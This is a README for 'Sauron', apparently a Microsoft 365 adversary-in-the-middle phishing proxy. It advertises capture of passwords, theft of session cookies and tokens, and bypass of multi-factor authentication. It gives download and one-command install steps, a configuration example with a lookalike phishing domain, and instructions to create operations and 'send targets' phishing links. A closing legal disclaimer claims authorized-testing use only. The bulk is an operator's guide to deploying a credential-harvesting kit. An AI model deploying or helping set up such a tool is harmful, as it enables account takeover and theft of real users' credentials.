
# Sauron - Microsoft 365 MITM Proxy

Microsoft 365 login flow interception for credential capture and session harvesting.

## 🎯 What It Does

- **Captures Credentials**: Real-time username/password capture
- **Steals Sessions**: Microsoft authentication cookies and tokens
- **2FA Bypass**: Multi-factor authentication token harvesting
- **Live Monitoring**: WebSocket dashboard for real-time operations
- **SSL Automation**: Automatic HTTPS certificates

## 🚀 Installation

### Requirements

- Ubuntu 20.04+ VPS with root access
- Domain name pointed to your server
- Cloudflare account (free tier works)

### Production Release (Linux VPS)

```bash
# 1. Download the latest Linux release
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz

# 2. Extract and install
tar -xzf sauron-linux-amd64.tar.gz
cd sauron

# 3. One-command setup (handles everything automatically)
sudo ./install-production.sh
```

**That's it!** The installer will:
- Install Docker and system dependencies automatically
- Walk you through Cloudflare setup step-by-step
- Configure SSL certificates with Let's Encrypt
- Start Sauron service automatically

### Development Build (Source Access)

```bash
# Only if you have source code access
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro
sudo ./install/setup.sh
```

### Configuration

Edit `.env` file with your settings:

```bash
# Your phishing domain
SAURON_DOMAIN=microsoftlogin365.com

# Cloudflare API token (for SSL automation)
CLOUDFLARE_API_TOKEN=your_token_here

# Turnstile secret (optional bot protection)
TURNSTILE_SECRET=your_secret_here
```

## 📱 Usage

### Access Points

- **Admin Panel**: `https://yourdomain.com/admin`
- **Statistics**: `https://yourdomain.com/stats`
- **WebSocket**: `wss://yourdomain.com/ws`

### Creating Operations

1. Open admin panel: `https://yourdomain.com/admin`
2. Create a new slug (operation identifier)
3. Send targets to: `https://login.yourdomain.com/your-slug`

### Management Commands

```bash
# Check status
sudo systemctl status sauron

# View logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron
```

## 🛠️ Development

### Building Releases

```bash
# Build binary release package
./scripts/build-release.sh v2.0.1

# Build Docker release package
./scripts/build-docker-release.sh v2.0.1

# Deploy to production server
./scripts/deploy-production.sh
```

### Project Structure

- `scripts/` - Build and deployment automation scripts
- `docs/` - Documentation and API reference
- `.env.example` - Configuration template
- `LICENSE` - MIT license with security tool disclaimers
- **Note**: Source code is not included in this repository for security purposes

## 📚 Documentation

**[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**

Includes:
- Advanced configuration options
- API endpoint documentation
- Troubleshooting guides
- Security best practices

## ⚠️ Legal Notice & Disclaimer

**IMPORTANT: READ BEFORE USE**

This software is provided for **educational and authorized security testing purposes only**. By downloading, installing, or using this software, you acknowledge and agree to the following:

### 🔒 Authorized Use Only
- This tool is intended **ONLY** for authorized penetration testing, security research, and educational purposes
- You must have **explicit written permission** from the target system owner before use
- Unauthorized access to computer systems is **illegal** and may violate local, state, federal, and international laws

### 🚫 Prohibited Activities
- **DO NOT** use this software for unauthorized access to any system
- **DO NOT** use this software for malicious purposes, fraud, or illegal activities
- **DO NOT** use this software to violate any applicable laws or regulations

### 🛡️ Disclaimer of Liability
- The authors and contributors provide this software **"AS IS"** without any warranties
- **NO LIABILITY** is accepted for any damages, losses, or legal consequences resulting from use
- Users assume **FULL RESPONSIBILITY** for compliance with applicable laws
- The authors **DISCLAIM ALL LIABILITY** for misuse of this software

### 📋 User Responsibilities
- Verify legal compliance in your jurisdiction before use
- Obtain proper authorization before conducting any security tests
- Use responsibly and ethically in accordance with applicable laws
- Report vulnerabilities through proper disclosure channels

### 🏛️ Jurisdiction & Compliance
- Users are responsible for compliance with all applicable laws including but not limited to:
  - Computer Fraud and Abuse Act (CFAA)
  - Digital Millennium Copyright Act (DMCA)
  - General Data Protection Regulation (GDPR)
  - Local privacy and cybersecurity regulations

**By using this software, you acknowledge that you have read, understood, and agree to be bound by these terms.**

## 📄 License

This project is licensed under the MIT License with additional security tool disclaimers - see the [LICENSE](LICENSE) file for details.

---

**For questions or issues, check the documentation or open a GitHub issue.**
